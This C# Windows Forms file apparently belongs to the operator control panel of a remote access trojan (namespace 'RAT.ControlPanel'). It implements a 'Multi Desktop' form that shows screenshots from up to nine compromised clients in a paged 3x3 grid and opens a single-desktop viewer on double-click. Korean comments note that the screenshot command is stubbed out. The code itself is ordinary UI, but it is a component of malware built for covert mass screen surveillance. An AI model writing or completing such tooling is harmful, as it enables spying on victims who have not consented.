using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmMultiDesktop : Form
    {
        private List<ClientInfo> clients;
        private MainForm mainForm;
        private int currentPage = 1;
        private const int GRID_SIZE = 9; // 3x3
        private PictureBox[] pictureBoxes;
        private Dictionary<string, Image> lastScreenshots;
        
        public frmMultiDesktop(List<ClientInfo> clients, MainForm mainForm)
        {
            this.clients = clients;
            this.mainForm = mainForm;
            this.lastScreenshots = new Dictionary<string, Image>();
            InitializeComponent();
            this.Text = $"Multi Desktop - {clients.Count} Clients";
        }
        
        private void frmMultiDesktop_Load(object sender, EventArgs e)
        {
            SetupGrid();
            UpdatePageLabel();
            timerRefresh.Start();
        }
        
        private void SetupGrid()
        {
            pictureBoxes = new PictureBox[GRID_SIZE];
            
            for (int i = 0; i < 3; i++)
            {
                for (int j = 0; j < 3; j++)
                {
                    int index = i * 3 + j;
                    var pb = new PictureBox
                    {
                        Dock = DockStyle.Fill,
                        BackColor = Color.Black,
                        SizeMode = PictureBoxSizeMode.Zoom,
                        Tag = index,
                        BorderStyle = BorderStyle.FixedSingle
                    };
                    
                    pb.DoubleClick += PictureBox_DoubleClick;
                    tableLayoutPanel.Controls.Add(pb, j, i);
                    pictureBoxes[index] = pb;
                }
            }
            
            ClearAllImages();
        }
        
        private void ClearAllImages()
        {
            foreach (var pb in pictureBoxes)
            {
                pb.Image = CreateNoSignalImage();
            }
        }
        
        private Image CreateNoSignalImage()
        {
            var bmp = new Bitmap(320, 240);
            using (var g = Graphics.FromImage(bmp))
            {
                g.Clear(Color.Black);
                g.DrawString("No Signal", new Font("Segoe UI", 16, FontStyle.Bold), Brushes.White, new PointF(100, 100));
            }
            return bmp;
        }
        
        private void PictureBox_DoubleClick(object sender, EventArgs e)
        {
            var pb = sender as PictureBox;
            if (pb?.Tag == null) return;
            
            int index = (int)pb.Tag;
            int clientIndex = (currentPage - 1) * GRID_SIZE + index;
            
            if (clientIndex < clients.Count)
            {
                var client = clients[clientIndex];
                var form = new frmDesktop(client, mainForm);
                form.Show();
            }
        }
        
        private async void timerRefresh_Tick(object sender, EventArgs e)
        {
            await RefreshScreenshots();
        }
        
        private async Task RefreshScreenshots()
        {
            int startIndex = (currentPage - 1) * GRID_SIZE;
            
            for (int i = 0; i < GRID_SIZE && startIndex + i < clients.Count; i++)
            {
                var client = clients[startIndex + i];
                
                // 명령 전송 (실제 구현에서는 mainForm을 통해 전송)
                // await SendCommand(client, new { type = "screenshot" });
                
                // 임시: 마지막 스크린샷 표시
                if (lastScreenshots.ContainsKey(client.ClientId))
                {
                    pictureBoxes[i].Image = lastScreenshots[client.ClientId];
                }
            }
            
            await Task.CompletedTask;
        }
        
        public void UpdateScreenshot(string clientId, Image screenshot)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => UpdateScreenshot(clientId, screenshot)));
                return;
            }
            
            lastScreenshots[clientId] = screenshot;
            
            // 현재 페이지에 표시 중인 클라이언트인지 확인
            int startIndex = (currentPage - 1) * GRID_SIZE;
            for (int i = 0; i < GRID_SIZE && startIndex + i < clients.Count; i++)
            {
                if (clients[startIndex + i].ClientId == clientId)
                {
                    pictureBoxes[i].Image = screenshot;
                    break;
                }
            }
        }
        
        private void btnPrevious_Click(object sender, EventArgs e)
        {
            if (currentPage > 1)
            {
                ClearAllImages();
                currentPage--;
                UpdatePageLabel();
            }
        }
        
        private void btnNext_Click(object sender, EventArgs e)
        {
            int maxPage = (int)Math.Ceiling((double)clients.Count / GRID_SIZE);
            if (currentPage < maxPage)
            {
                ClearAllImages();
                currentPage++;
                UpdatePageLabel();
            }
        }
        
        private void UpdatePageLabel()
        {
            int maxPage = (int)Math.Ceiling((double)clients.Count / GRID_SIZE);
            lblPage.Text = $"Page {currentPage}/{maxPage}";
        }
        
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            timerRefresh?.Stop();
            base.OnFormClosing(e);
        }
    }
}
